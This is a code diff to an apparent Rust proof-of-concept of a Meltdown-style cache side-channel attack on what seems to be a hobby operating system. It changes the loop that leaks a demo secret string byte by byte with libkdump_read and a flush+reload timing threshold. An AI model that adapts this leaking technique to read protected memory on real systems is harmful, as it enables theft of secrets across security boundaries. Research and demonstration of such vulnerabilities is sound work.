@@ -263,7 +263,6 @@ pub fn main() {
     println!("Address of handle_signal is {:x}", handle_signal as u64);
     syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
     const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K TODO: Original uses 300 non-aligned entries, skips the first 2 for alignment
-    const SECRET: &str = "Whoever reads this is dumb.";
     let default_config = Config {
 		measurements: 3,
 		accept_after: 1,
@@ -319,11 +318,17 @@ pub fn main() {
 	println!("Current CPU time: {}", rdtsc());
 	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
 	
-	let mut index: usize = 0;
-	print!("Secret {} at address {:?}\nGot: ", SECRET, SECRET.as_ptr());
+	const secret_string: &str = "Whoever reads this is dumb.";
+	const SECRET: *const u8 = secret_string.as_ptr();
 	
-	while index < SECRET.len() {
-		let pointer = SECRET[index..index].as_ptr();
+	let mut index: usize = 0;
+	print!("Trying to read secret from address {:?}.\nGot: ", SECRET);
+	
+	while index < secret_string.len() {
+		let pointer;
+		unsafe {
+			pointer = SECRET.add(index);
+		}
 		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
 		print!("{}", value as u8 as char);
 		/*unsafe {
